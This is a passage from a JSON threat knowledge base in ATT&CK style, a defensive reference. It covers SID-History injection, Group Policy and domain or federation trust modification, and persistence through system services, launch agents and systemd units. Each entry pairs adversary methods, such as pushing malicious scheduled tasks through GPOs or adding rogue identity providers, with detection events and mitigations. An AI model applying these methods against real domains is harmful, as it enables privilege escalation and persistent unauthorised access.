unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SID)</a> An account can hold additional SIDs in the SID-History Active Directory attribute <a href=\"https://msdn.microsoft.com/library/ms679833.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SID-History Attribute)</a>, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values <a href=\"https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Well Known SIDs Jun 2017)</a> may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.","detection":"Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet <a href=\"https://technet.microsoft.com/library/ee617241.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Get-ADUser)</a>, especially users who have SID-History values from the same domain. <a href=\"https://adsecurity.org/?p=1772\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity SID History Sept 2015)</a> Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. <a href=\"https://adsecurity.org/?p=1772\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity SID History Sept 2015)</a> <a href=\"https://msdn.microsoft.com/library/ms677982.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DsAddSidHistory)</a>\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. <a href=\"https://msdn.microsoft.com/library/ms677982.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DsAddSidHistory)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Modification","Process: OS API Execution","User Account: User Account Metadata"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Clean up SID-History attributes after legitimate account migration is complete.\n\nConsider applying SID Filtering to interforest trusts, such as forest trusts and external trusts, to exclude SID-History from requests to access domain resources. SID Filtering ensures that any authentication requests over a trust only contain SIDs of security principals from the trusted domain (i.e preventing the trusted domain from claiming a user has membership in groups outside of the domain).\n\nSID Filtering of forest trusts is enabled by default, but may have been disabled in some cases to allow a child domain to transitively access forest trusts. SID Filtering of external trusts is automatically enabled on all created external trusts using Server 2003 or later domain controllers. <a href=\"https://technet.microsoft.com/library/cc755321.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Trust Considerations Nov 2014)</a> <a href=\"https://technet.microsoft.com/library/cc794757.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SID Filtering Quarantining Jan 2009)</a> However note that SID Filtering is not automatically applied to legacy trusts or may have been deliberately disabled to allow inter-domain access to resources.\n\nSID Filtering can be applied by: <a href=\"https://technet.microsoft.com/library/cc835085.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Netdom Trust Sept 2012)</a>\n\n* Disabling SIDHistory on forest trusts using the netdom tool (<code>netdom trust /domain: /EnableSIDHistory:no</code> on the domain controller)\n\n* Applying SID Filter Quarantining to external trusts using the netdom tool (<code>netdom trust &lt;TrustingDomainName&gt; /domain:&lt;TrustedDomainName&gt; /quarantine:yes</code> on the domain controller)\n\n* Applying SID Filtering to domain trusts within a single forest is not recommended as it is an unsupported configuration and can cause breaking changes. <a href=\"https://technet.microsoft.com/library/cc835085.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Netdom Trust Sept 2012)</a> <a href=\"https://adsecurity.org/?p=1640\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Kerberos GT Aug 2015)</a> If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust"}]}]},{"id":"T1484","name":"Domain or Tenant Policy Modification","description":"Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\n\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\n\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a> <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Abusing GPO Permissions)</a>\n* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)</a>\n* changing configuration settings within the AD environment to implement a Rogue Domain Controller.\n* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant <a href=\"https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Cross-Tenant Impersonation 2023)</a>\n\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.","detection":"It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>. <a href=\"https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)</a> <a href=\"https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 365 Defender Solorigate)</a> This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details. <a href=\"https://www.sygnia.co/golden-saml-advisory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Golden SAML)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/aa21-008a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA SolarWinds Cloud Detection)</a>\n\nConsider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings. <a href=\"https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Update or Repair Federated domain)</a> Some domain policy modifications, such as changes to federation settings, are likely to be rare. <a href=\"https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 365 Defender Solorigate)</a>","platforms":["Windows","Identity Provider"],"dataSources":["Active Directory: Active Directory Object Deletion","Active Directory: Active Directory Object Creation","Command: Command Execution","Active Directory: Active Directory Object Modification","Application Log: Application Log Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blogs.technet.microsoft.com/askds/2008/09/11/fun-with-wmi-filters-in-group-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WMI Filters)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/Policy/filtering-the-scope-of-a-gpo\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPO Security Filtering)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."},{"id":"M1047","name":"Audit","description":"Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later) <a href=\"https://github.com/BloodHoundAD/BloodHound\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Bloodhound)</a>."}],"subTechniques":[{"id":"T1484.001","name":"Group Policy Modification","description":"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path <code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>. <a href=\"https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Group Policy Basics)</a> <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a> \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a> <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Abusing GPO Permissions)</a> <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M Trends 2016)</a> <a href=\"https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Hacking Team Breach)</a> Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a>\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&amp;lt;GPO_PATH&amp;gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Abusing GPO Permissions)</a> In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&amp;lt;GPO_PATH&amp;gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs. <a href=\"https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y SeEnableDelegationPrivilege Right)</a>","detection":"It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\n\n* Event ID 5136 - A directory service object was modified\n* Event ID 5137 - A directory service object was created\n* Event ID 5138 - A directory service object was undeleted\n* Event ID 5139 - A directory service object was moved\n* Event ID 5141 - A directory service object was deleted\n\n\nGPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).","platforms":["Windows"],"dataSources":["Command: Command Execution","Active Directory: Active Directory Object Creation","Active Directory: Active Directory Object Modification","Active Directory: Active Directory Object Deletion"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blogs.technet.microsoft.com/askds/2008/09/11/fun-with-wmi-filters-in-group-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WMI Filters)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/Policy/filtering-the-scope-of-a-gpo\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPO Security Filtering)</a>"},{"id":"M1047","name":"Audit","description":"Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later). <a href=\"https://github.com/BloodHoundAD/BloodHound\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Bloodhound)</a>"}]},{"id":"T1484.002","name":"Trust Modification","description":"Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure AD Federation)</a> These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user. <a href=\"https://o365blog.com/post/federation-vulnerability/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals zure AD Federated Domain)</a> \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant. <a href=\"https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Cross-Tenant Impersonation 2023)</a> This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts. <a href=\"https://d1.awsstatic.com/onedam/marketing-channels/website/aws/en_US/events/approved/reinforce-2025/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS re Inforce Trust Mod)</a>","detection":"Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>. <a href=\"https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)</a> This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details. <a href=\"https://www.sygnia.co/golden-saml-advisory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Golden SAML)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/aa21-008a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA SolarWinds Cloud Detection)</a>\n\nMonitor for PowerShell commands such as: <code>Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\"</code>, or <code>Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\" –supportmultipledomain</code>. <a href=\"https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Update or Repair Federated domain)</a>","platforms":["Identity Provider","Windows"],"dataSources":["Command: Command Execution","Application Log: Application Log Content","Active Directory: Active Directory Object Modification","Active Directory: Active Directory Object Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, limit permissions to create new identity providers to only those accounts that require them. In AWS environments, consider using Service Control policies to limit the use of API calls such as <code>CreateSAMLProvider</code> or <code>CreateOpenIDConnectProvider</code>."},{"id":"M1026","name":"Privileged Account Management","description":"Use the principal of least privilege and protect administrative access to domain trusts and identity tenants."}]}]},{"id":"T1543","name":"Create or Modify System Process","description":"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. <a href=\"https://technet.microsoft.com/en-us/library/cc772408.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Services)</a> On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs Launch Agent Daemons)</a> \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. <a href=\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Detection)</a>","detection":"Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.","platforms":["Containers","Linux","macOS","Windows"],"dataSources":["Service: Service Creation","Container: Container Creation","Driver: Driver Load","Service: Service Modification","Process: Process Creation","Windows Registry: Windows Registry Key Modification","File: File Modification","File: File Creation","Windows Registry: Windows Registry Key Creation","Process: OS API Execution","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with system-level process changes and service configurations."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to system-level process files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root."},{"id":"M1028","name":"Operating System Configuration","description":"Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to trusted repositories only and be cautious of orphaned software packages."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system. <a href=\"https://www.microsoft.com/security/blog/2021/12/08/improve-kernel-security-with-the-new-microsoft-vulnerable-and-malicious-driver-reporting-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Driver Reporting Center)</a> On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed drivers. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft driver block rules)</a>"},{"id":"M1045","name":"Code Signing","description":"Enforce registration and execution of only legitimately signed service drivers where possible."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."},{"id":"M1054","name":"Software Configuration","description":"Where possible, consider enforcing the use of container services in rootless mode to limit the possibility of privilege escalation or malicious effects on the host running the container."}],"subTechniques":[{"id":"T1543.001","name":"Launch Agent","description":"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs Launch Agent Daemons)</a> <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a> <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Antiquated Mac Malware)</a> Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX.Dok Malware)</a> Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. <a href=\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sofacy Komplex Trojan)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions. <a href=\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Detection)</a> <a href=\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OceanLotus for OS X)</a>","detection":"Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\n\nEnsure Launch Agent's <code> ProgramArguments </code> key pointing to executables located in the <code>/tmp</code> or <code>/shared</code> folders are in alignment with enterprise policy. Ensure all Launch Agents with the <code>RunAtLoad</code> key set to <code>true</code> are in alignment with policy.","platforms":["macOS"],"dataSources":["File: File Modification","Service: Service Modification","File: File Creation","Service: Service Creation","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Set group policies to restrict file permissions to the <code>~/launchagents</code> folder. <a href=\"https://antman1p-30185.medium.com/defeating-malicious-launch-persistence-156e2b40fc67\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: piazza launch agent mitigation)</a>"}]},{"id":"T1543.002","name":"Systemd Service","description":"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. <a href=\"http://man7.org/linux/man-pages/man1/systemd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux man-pages: systemd January 2014)</a> Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the <code>.service</code> file extension to encode information about a service's process. By default, system level unit files are stored in the <code>/systemd/system</code> directory of the root owned directories (<code>/</code>). User level unit files are stored in the <code>/systemd/user</code> directories of the user owned directories (<code>$HOME</code>). <a href=\"https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lambert systemd 2022)</a> \n\nInside the <code>.service</code> unit files, the following directives are used to execute commands: <a href=\"https://www.freedesktop.org/software/systemd/man/systemd.service.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: freedesktop systemd.service)</a>  \n\n* <code>ExecStart</code>, <code>ExecStartPre</code>, and <code>ExecStartPost</code> directives execute when a service is started manually by <code>systemctl</code> or on system start if the service is set to automatically start.\n* <code>ExecReload</code> directive executes when a service restarts. \n* <code>ExecStop</code>, <code>ExecStopPre</code>, and <code>ExecStopPost</code> directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a <code>.service</code> file’s directive executes, and modified the user directive a <code>.service</code> file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. <a href=\"https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Rocke March 2019)</a> <a href=\"http://www.ouah.org/backdoors.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: airwalk backdoor unix systems)</a> <a href=\"https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 Service Persistence 22JUNE2016)</a> \n\nThe <code>.service</code> file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. \n\nSystemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., Boot or Logon Initialization Scripts). <a href=\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs Linux Persistence 2024)</a> <a href=\"https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pepe Berba Systemd 2022)</a>","detection":"Monitor file creation and modification events of Systemd service unit configuration files in the default directory locations for <code>root</code> &amp; <code>user</code> level permissions. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the <code>root</code> user. <a href=\"https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lambert systemd 2022)</a> \n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables, and symbolic links. <a href=\"https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Berba hunting linux systemd)</a>\n\nAuditing the execution and command-line arguments of the <code>systemctl</code> utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.","platforms":["Linux"],"dataSources":["Command: Command Execution","File: File Modification","Service: Service Creation","Service: Service Modification","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user access to system utilities such as <code>systemctl</code> to only users who have a legitimate need."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to systemd unit files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"The creation and modification of systemd service unit files is generally reserved for administrators such as the Linux root user and other users with superuser privileges."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to trusted repositories only and be cautious of orphaned software packages."}]},{"id":"T1543.003","name":"Windows Service","description":"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. 